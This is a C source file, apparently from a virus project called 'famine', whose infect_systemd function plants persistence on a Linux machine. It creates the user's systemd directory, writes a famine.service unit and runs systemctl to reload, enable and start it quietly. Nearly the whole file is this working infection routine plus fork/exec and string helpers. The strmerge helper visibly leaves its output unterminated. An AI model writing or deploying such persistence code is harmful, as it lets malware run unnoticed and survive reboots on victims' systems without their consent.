#include "famine.h"

#include <stdio.h>
static char* cut_section(const char* path, int index);
static char* strmerge(const char* str1, const char* str2);

int infect_systemd() {

    // create dir ~/.config/systemd/user/
    const char* home = getenv("HOME");
    if (!home)
        _exit(1);

    const char* user_dir = "/.config/systemd/user/";

    for (int i = 0; i < 3; i++) {
        char* curr_section = cut_section(user_dir, i);
        char* curr_dir = strmerge(home, curr_section);
        free(curr_section);

        if (mkdir(curr_dir, 0777) && errno != EEXIST) {
            free(curr_dir);
            _exit(1);
        }

        free(curr_dir);
    }

    // create and fill famine.service
    const char* service = "famine.service";
    char* temp_path = strmerge(home, user_dir);
    char* full_path = strmerge(temp_path, service);
    free(temp_path);

    int fd_daemon = open(full_path, O_WRONLY | O_CREAT | O_EXCL, 0666);
    free(full_path);

    if (fd_daemon < 0 && errno != EEXIST) {
        _exit(1);
    }

    int literal_len = sizeof(FAMINE_SERVICE) - 1;
    if (write(fd_daemon, FAMINE_SERVICE, literal_len) < literal_len)
        _exit(1);
    
    // reload, enable and start daemon
    const char* cmd = "/usr/bin/systemctl";
    char* const reload_args[] = {"systemctl", "--user", "daemon-reload", NULL};
    char* const enable_args[] = {"systemctl", "--quiet", "--user", "enable", (char*)service, NULL};
    char* const start_args[] = {"systemctl", "--quiet", "--user", "start", (char*)service, NULL};

    run(cmd, reload_args);
    run(cmd, enable_args);
    run(cmd, start_args);

    return (0);
}

void run(const char* cmd, char* const args[]) {

    int pid = fork();

    if (pid < 0)
        _exit(1);
    if (pid == 0) {
        execve(cmd, args, environ);
        _exit(1);
    }

    int status;
    if (waitpid(pid, &status, 0) < 0)
        _exit(1);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
        _exit(1);
}

static char* cut_section(const char* path, int index) {

    int section_len = 1;
    int local_index = 0;

    while (local_index <= index && path[section_len]) {
        section_len++;

        if (path[section_len] == '/')
            local_index++;
    }

    char* ret = malloc(sizeof(char) * (section_len + 1));
    if (!ret)
        _exit(1);

    for (int i = 0; i < section_len; i++) {
        ret[i] = path[i];
    }
    ret[section_len] = '\0';

    return (ret);
}

static char* strmerge(const char* str1, const char* str2) {

    int str1_len = strlen(str1);
    int str2_len = strlen(str2);

    if (str1_len == 0 || str2_len == 0)
        _exit(1);

    char* ret = malloc(sizeof(char) * (str1_len + str2_len + 1));
    if (!ret)
        _exit(1);

    for (int i = 0; i < str1_len; i++)
        ret[i] = str1[i];

    for (int i = 0; i < str2_len; i++)
        ret[str1_len + i] = str2[i];

    return (ret);
}
